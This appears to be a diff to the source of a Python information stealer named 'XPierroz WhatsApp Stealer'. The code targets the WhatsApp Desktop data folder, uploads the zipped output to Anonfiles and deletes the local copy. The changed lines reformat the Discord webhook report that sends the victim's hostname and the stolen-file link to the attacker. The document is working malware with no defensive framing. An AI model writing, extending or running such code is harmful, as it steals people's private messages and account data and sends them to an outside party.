@@ -5,6 +5,8 @@ import time
 import socket
 import shutil
 
+# PSG > OM
+
 WEBHOOK = "xpierroz on top"
 direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
 print(direct)
@@ -30,4 +32,20 @@ except Exception:
 
 m = uploadToAnonfiles(f"{os.getcwd()}\\ssouput.zip")
 os.remove(f"{os.getcwd()}\\ssouput.zip")
-dhooks.Webhook(WEBHOOK).send(f"```xpierroz WhatsApp Stealer - grabbed {socket.gethostname()} - {m}```")
+
+message = f"**XPierroz WhatsApp Stealer Report**\n\n"
+message += f"📌 Pc: {socket.gethostname()}\n"
+message += f"🔍 Url: {m}"
+
+embed = dhooks.Embed(
+    title="🔔 Grab Alert",
+    description=message,
+    color=0xFF5733
+)
+
+webhook = dhooks.Webhook(
+    url=WEBHOOK,
+    username="XPierroz WhatsApp Stealer",
+    avatar_url="https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true"
+)
+webhook.send(embed=embed)
